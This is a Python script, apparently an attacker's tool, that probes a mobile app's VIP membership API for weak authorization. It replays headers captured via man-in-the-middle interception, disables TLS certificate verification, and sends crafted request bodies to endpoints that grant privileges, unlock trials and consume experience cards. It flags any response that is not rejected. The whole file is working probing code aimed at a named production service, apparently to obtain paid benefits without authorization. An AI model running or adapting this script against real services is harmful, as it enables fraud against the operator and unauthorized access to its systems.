"""card_probe4.py — 探测「发权益」类接口的授权强度

目标接口（都是 member_privilege_center/v3）：
  vip_privilege/receive        领取权益
  vip_privilege/course_win     课程奖励
  vip_trial/unlock             解锁试用
  vip_trial/card_detail        试用卡详情
  vip_experience_card/batch_query_receive_status
  vip_experience_card/user_use_card
"""
import json
import pathlib
import ssl
import sys
import time
import urllib.error
import urllib.request

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

ROOT = pathlib.Path(r"<WORKDIR>\artifacts\mitm")
BASE = "https://api-cn.hellotalk8.com/member_privilege_center/v3/"
UID = <UID>


def load_headers():
    data = json.loads((ROOT / "headers_write_off_card.json").read_text(encoding="utf-8"))
    return dict(data["headers"])


def post(headers, path, body):
    data = json.dumps(body, separators=(",", ":")).encode("utf-8")
    req = urllib.request.Request(BASE + path, data=data, method="POST")
    for k, v in headers.items():
        req.add_header(k, v)
    req.add_header("content-type", "application/json; charset=UTF-8")
    try:
        with urllib.request.urlopen(req, timeout=25, context=CTX) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")[:300]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:300]
    except Exception as e:
        return None, f"{type(e).__name__}: {e}"


VARIANTS = [
    ("只 user_id", {"user_id": UID}),
    ("user_id + feature 00001", {"user_id": UID, "feature_id": "00001"}),
    ("user_id + card_type", {"user_id": UID, "card_type": "1"}),
    ("user_id + scene", {"user_id": UID, "scene_id": "20000"}),
    ("user_id + feature + scene", {"user_id": UID, "feature_id": "00001", "scene_id": "20000"}),
    ("user_id + card_id 占位", {"user_id": UID, "card_id": "000000000000000000000000"}),
]


def try_ep(h, path, label):
    print(f"\n=== {label} ({path}) ===")
    for note, body in VARIANTS:
        code, text = post(h, path, body)
        mark = "  " if "bad request" in text else "⭐"
        print(f" {mark} {note:<28} [{code}] {text[:200]}")
        time.sleep(0.35)


def main():
    h = load_headers()
    try_ep(h, "vip_privilege/receive", "领取权益")
    try_ep(h, "vip_privilege/course_win", "课程奖励")
    try_ep(h, "vip_trial/unlock", "解锁试用")
    try_ep(h, "vip_trial/card_detail", "试用卡详情")
    try_ep(h, "vip_experience_card/batch_query_receive_status", "批量收卡状态")
    try_ep(h, "vip_experience_card/user_use_card", "使用卡")
    return 0


if __name__ == "__main__":
    sys.exit(main())
